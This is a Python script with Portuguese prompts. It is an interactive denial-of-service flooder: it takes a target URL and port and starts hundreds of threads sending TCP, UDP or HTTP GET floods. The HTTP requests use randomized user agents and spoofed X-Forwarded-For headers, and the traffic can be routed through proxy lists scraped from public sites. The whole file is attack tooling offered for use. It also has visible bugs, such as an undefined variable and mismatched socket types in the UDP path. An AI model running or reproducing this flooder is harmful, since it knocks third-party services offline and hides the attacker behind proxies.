import socket
import socks
import threading
import random
import re
import urllib.request
import os
import sys
import json
from bs4 import BeautifulSoup
import logging

# Configurando o logger
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Desativar os avisos do scapy
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# Configurações padrão
DEFAULT_CONFIG = {
    "threads": 800,
    "amplification": 1,
    "use_proxy": False,
    "proxy_type": "http",  # "http" ou "socks"
    "proxy_list": "proxy.txt"
}

# Carregar configurações externas
def load_config(config_file="config.json"):
    if os.path.exists(config_file):
        with open(config_file, 'r') as f:
            return json.load(f)
    return DEFAULT_CONFIG

config = load_config()

# Verificação de plataforma
if sys.platform.startswith("linux") or sys.platform.startswith("freebsd"):
    from scapy.all import *
else:
    logging.error("FLOOD TCP/UDP NÃO É SUPORTADO NESTE SISTEMA. VOCÊ DEVE USAR FLOOD HTTP.")
    sys.exit(1)

# Lista de User-Agents
useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
			"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
			"Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
			"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
			"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
			"Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
			"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
			"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
			"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",]

# Funções principais

def starturl():
    global url, url2, urlport

    url = input("\nColoque a URL: ").strip()

    if not url:
        logging.warning("URL não fornecida. Tente novamente.")
        starturl()

    if not url.startswith("http"):
        url = "http://" + url

    try:
        url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    except:
        url2 = url

    try:
        urlport = url.split(":")[2]
    except IndexError:
        urlport = "80"

    floodmode()

def floodmode():
    global choice1
    choice1 = input("Digite '0' , '1' ou '2'  ")
    if choice1 == "0":
        proxymode()
    elif choice1 in ["1", "2"]:
        if os.getuid() != 0:
            logging.error("Use root para usar TCP ou UDP.")
            sys.exit(1)
        floodport()
    else:
        logging.warning("Opção inválida. Tente novamente.")
        floodmode()

def floodport():
    global port
    try:
        port = int(input("Insira o número da porta que você quer floodar: "))
        if port < 1 or port > 65535:
            raise ValueError("Porta fora do intervalo permitido.")
    except ValueError as ve:
        logging.warning(f"Entrada inválida: {ve}. Tente novamente.")
        floodport()

    proxymode()

def proxymode():
    global use_proxy, proxy_type, choice2
    choice2 = input("Quer usar um proxy, digite 'y': ").lower()
    use_proxy = choice2 == 'y'
    if use_proxy:
        proxy_type = input("'0' para modo proxy HTTP ou '1' para modo socks ").strip()
        if proxy_type not in ["0", "1"]:
            logging.warning("Opção inválida. Tente novamente.")
            proxymode()
        proxy_type = "http" if proxy_type == "0" else "socks"
        choicedownproxy() if proxy_type == "http" else choicedownsocks()
    else:
        numthreads()

# Restante do código continua o mesmo...


def choicedownproxy():
    choice = input("Você quer baixar uma nova lista de proxies? Responda 'y' para fazer isso: ").lower()
    if choice == 'y':
        choicemirror1()
    else:
        proxylist()

def choicedownsocks():
    choice = input("Você quer baixar uma nova lista de socks? Responda 'y' para fazer isso: ").lower()
    if choice == 'y':
        choicemirror2()
    else:
        proxylist()

def choicemirror1():
    global urlproxy
    choice = input("Baixar de: free-proxy-list.net='0'(melhor) ou inforge.net='1' ")
    urlproxy = "http://free-proxy-list.net/" if choice == "0" else "https://www.inforge.net/xi/forums/liste-proxy.1118/"
    proxyget1()

def choicemirror2():
    global urlproxy
    choice = input("Baixar de: socks-proxy.net='0'(melhor) ou inforge.net='1' ")
    urlproxy = "https://www.socks-proxy.net/" if choice == "0" else "https://www.inforge.net/xi/forums/liste-proxy.1118/"
    proxyget1()

def proxyget1():
    try:
        req = urllib.request.Request(urlproxy)
        req.add_header("User-Agent", random.choice(useragents))
        sourcecode = urllib.request.urlopen(req)
        soup = BeautifulSoup(sourcecode, "html.parser")
        proxies = []

        for proxy in soup.find_all('tr'):
            ip = proxy.find_all('td')[0].get_text()
            port = proxy.find_all('td')[1].get_text()
            proxies.append(f"{ip}:{port}")

        with open(config['proxy_list'], 'w') as out_file:
            out_file.write("\n".join(proxies))

        logging.info("Proxies baixados com sucesso.")
    except Exception as e:
        logging.error(f"Erro ao baixar proxies: {e}")

    proxylist()

def proxylist():
    global proxies
    try:
        with open(config['proxy_list'], 'r') as f:
            proxies = [line.strip() for line in f.readlines() if validate_proxy(line.strip())]
        logging.info(f"{len(proxies)} proxies válidos carregados.")
    except FileNotFoundError:
        logging.error("Arquivo de proxies não encontrado.")
        sys.exit(1)

    numthreads()

def validate_proxy(proxy):
    try:
        ip, port = proxy.split(":")
        socket.create_connection((ip, int(port)), timeout=5)
        return True
    except Exception:
        return False

def numthreads():
    global threads
    try:
        threads = int(input(f"Insira o número de threads ({config['threads']} recomendado): "))
    except ValueError:
        threads = config['threads']
        logging.warning(f"{threads} threads selecionadas.")
    multiplication()

def multiplication():
    global multiple
    try:
        multiple = int(input("Número de amplificação [(1-5=normal)(50=forte)(100 ou mais)]: "))
    except ValueError:
        multiple = config['amplification']
        logging.warning(f"{multiple}x amplificação selecionada.")
    begin()

def begin():
    choice = input("Pressione 'enter' para iniciar: ")
    if choice.lower() in ["", "enter"]:
        loop()
    else:
        logging.info("Execução cancelada.")
        sys.exit(0)

# ... as classes para as threads (tcpflood, udpflood, etc.) continuam iguais.

def loop():
	global threads
	global get_host
	global acceptall
	global connection
	global go
	global x
	if choice1 == "0": 
		get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", "Accept-Encoding: gzip, deflate\r\n", "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"]
		connection = "Connection: Keep-Alive\r\n" 
	x = 0 
	go = threading.Event()
	if choice1 == "1": 
		if choice2 == "y": 
			if choice3 == "0": 
				for x in range(threads):
					tcpfloodproxed(x+1).start() 
					print ("Thread " + str(x) + " pronta!")
				go.set() 
			else: 
				for x in range(threads):
					tcpfloodsocked(x+1).start() 
					print ("Thread " + str(x) + " pronta!")
				go.set() 
		else: 
			for x in range(threads):
				tcpflood(x+1).start() 
				print ("Thread " + str(x) + " pronta!")
			go.set() 
	else: 
		if choice1 == "2": 
			if choice2 == "y": 
				if choice3 == "0": 
					for x in range(threads):
						udpfloodproxed(x+1).start() 
						print ("Thread " + str(x) + " pronta!")
					go.set() 
				else: 
					for x in range(threads):
						udpfloodsocked(x+1).start() 
						print ("Thread " + str(x) + " pronta!")
					go.set() 
			else: 
				for x in range(threads):
					udpflood(x+1).start() 
					print ("Thread " + str(x) + " pronta!")
				go.set() 
		else: 
			if choice2 == "y": 
				if choice3 == "0": 
					for x in range(threads):
						requestproxy(x+1).start() 
						print ("Thread " + str(x) + " pronta!")
					go.set() 
				else: 
					for x in range(threads):
						requestsocks(x+1).start() 
						print ("Thread " + str(x) + " pronta!")
					go.set() 
			else: 
				for x in range(threads):
					requestdefault(x+1).start() 
					print ("Thread " + str(x) + " pronta!")
				go.set() 

class tcpfloodproxed(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		data = random._urandom(1024) 
		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) 
		current = x 
		if current < len(proxies): 
			proxy = proxies[current].strip().split(':')
		else: 
			proxy = random.choice(proxies).strip().split(":")
		go.wait() 
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) 
				s = socks.socksocket() 
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
					s.close()
			except: 
				s.close() 

class tcpfloodsocked(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		data = random._urandom(1024) 
		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) 
		current = x 
		if current < len(proxies): 
			proxy = proxies[current].strip().split(':')
		else: 
			proxy = random.choice(proxies).strip().split(":")
		go.wait() 
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) 
				s = socks.socksocket() 
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
					s.close()
			except: 
				s.close() 
				try:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
					s = socks.socksocket() 
					s.connect((str(url2),int(port))) 
					s.send(p) 
					print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
					try: 
						for y in range(multiple): 
							s.send(str.encode(p)) 
					except: 
						s.close()
				except: 
					print ("Sock down. Tentando novamente. @", self.counter)
					s.close() 

class tcpflood(threading.Thread): 

	def __init__(self, counter):
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		data = random._urandom(1024) 
		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) 
		go.wait() 
		while True: 
			try: 
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("Requisição Enviada! @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
					s.close()
			except: 
				s.close() 

class udpfloodproxed(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		data = random._urandom(1024) 
		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) 
		current = x 
		if current < len(proxies): 
			proxy = proxies[current].strip().split(':')
		else: 
			proxy = random.choice(proxies).strip().split(":")
		go.wait() 
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, str(proxy[0]), int(proxy[1]), True) 
				s = socks.socksocket() 
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
					s.close()
			except: 
				s.close() 

class udpfloodsocked(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		data = random._urandom(1024) 
		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) 
		current = x 
		if current < len(proxies): 
			proxy = proxies[current].strip().split(':')
		else: 
			proxy = random.choice(proxies).strip().split(":")
		go.wait() 
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) 
				s = socks.socksocket() 
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
					s.close()
			except: 
				s.close() 
				try:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
					s = socks.socksocket() 
					s.connect((str(url2),int(port))) 
					s.send(p) 
					print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
					try: 
						for y in range(multiple): 
							s.send(str.encode(p)) 
					except: 
						s.close()
				except: 
					print ("Sock down. Tentando novamente. @", self.counter)
					s.close() 

class udpflood(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		data = random._urandom(1024) 
		p = bytes(IP(dst=str(url2))/UDP(dport=int(port))/data) 
		go.wait() 
		while True: 
			try: 
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
				s.connect((str(url2),int(port))) 
				s.send(p) 
				print ("Requisição Enviada! @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(p)) 
				except: 
					s.close()
			except: 
				s.close() 

class requestproxy(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
		accept = random.choice(acceptall) 
		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
		forward = "X-Forwarded-For: " + randomip + "\r\n" 
		request = get_host + useragent + accept + forward + connection + "\r\n" 
		current = x 
		if current < len(proxies): 
			proxy = proxies[current].strip().split(':')
		else: 
			proxy = random.choice(proxies).strip().split(":")
		go.wait() 
		while True: 
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
				s.connect((str(proxy[0]), int(proxy[1]))) 
				s.send(str.encode(request)) 
				print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(request)) 
				except: 
					s.close()
			except:
				s.close() 

class requestsocks(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
		accept = random.choice(acceptall) 
		request = get_host + useragent + accept + connection + "\r\n" 
		current = x 
		if current < len(proxies): 
			proxy = proxies[current].strip().split(':')
		else: 
			proxy = random.choice(proxies).strip().split(":")
		go.wait() 
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) 
				s = socks.socksocket() 
				s.connect((str(url2), int(urlport))) 
				s.send (str.encode(request)) 
				print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(request)) 
				except: 
					s.close()
			except: 
				s.close() 
				try: 
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) 
					s = socks.socksocket() 
					s.connect((str(url2), int(urlport))) 
					s.send (str.encode(request)) 
					print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
					try: 
						for y in range(multiple): 
							s.send(str.encode(request)) 
					except: 
						s.close()
				except:
					print ("Sock down. Tentando novamente. @", self.counter)
					s.close() 

class requestdefault(threading.Thread): 

	def __init__(self, counter): 
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): 
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n" 
		accept = random.choice(acceptall) 
		request = get_host + useragent + accept + connection + "\r\n" 
		go.wait() 
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
				s.connect((str(url2), int(urlport))) 
				s.send (str.encode(request)) 
				print ("Requisição enviada! @", self.counter) 
				try: 
					for y in range(multiple): 
						s.send(str.encode(request)) 
				except: 
					s.close()
			except: 
				s.close() 

starturl()
